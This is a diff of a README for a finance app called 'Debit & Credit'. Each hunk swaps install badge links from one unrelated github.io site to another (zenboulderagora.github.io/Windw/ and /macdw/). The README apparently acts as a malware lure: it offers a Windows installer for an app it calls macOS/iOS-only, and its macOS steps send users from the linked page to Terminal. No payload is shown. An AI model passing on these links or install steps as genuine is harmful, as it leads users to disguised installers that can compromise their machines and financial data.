@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Debit & Credit](https://img.shields.io/badge/⬇_Install_Debit+and+Credit-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Debit & Credit](https://img.shields.io/badge/⬇_Install_Debit+and+Credit-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
 
 </div>
 
@@ -61,9 +61,9 @@ Debit & Credit is a macOS and iOS personal finance app for tracking transactions
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
 
 </div>
 
@@ -81,7 +81,7 @@ Debit & Credit is a macOS and iOS personal finance app for tracking transactions
 
 <div align="center">
 
-[![⬇ Install Debit & Credit](https://img.shields.io/badge/⬇_Install_Debit+and+Credit-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Debit & Credit](https://img.shields.io/badge/⬇_Install_Debit+and+Credit-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
 
 </div>
 
@@ -100,7 +100,7 @@ Debit & Credit is a macOS and iOS personal finance app for tracking transactions
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -125,7 +125,7 @@ Debit & Credit is a macOS and iOS personal finance app for tracking transactions
 
 <div align="center">
 
-[![⬇ Install Debit & Credit](https://img.shields.io/badge/⬇_Install_Debit+and+Credit-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Debit & Credit](https://img.shields.io/badge/⬇_Install_Debit+and+Credit-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
 
 </div>
 
